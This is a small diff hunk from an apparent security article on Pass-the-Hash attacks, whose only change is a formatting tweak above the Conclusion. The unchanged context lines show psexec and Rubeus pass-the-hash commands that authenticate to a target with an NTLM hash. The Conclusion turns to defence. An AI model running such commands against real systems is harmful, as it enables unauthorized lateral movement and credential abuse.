@@ -89,7 +89,7 @@ psexec.exe \\TARGET_IP -u TARGET_DOMAIN\USER -p NTLM_HASH cmd.exe
 Rubeus.exe pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /target:TARGET_IP
 ```
 
-
+<br/>
 ## Conclusion
 
 Pass-the-Hash attacks are dangerous because they exploit inherent weaknesses in Windows authentication mechanisms. To defend against PtH attacks, organizations should adopt a multi-layered security approach, including:
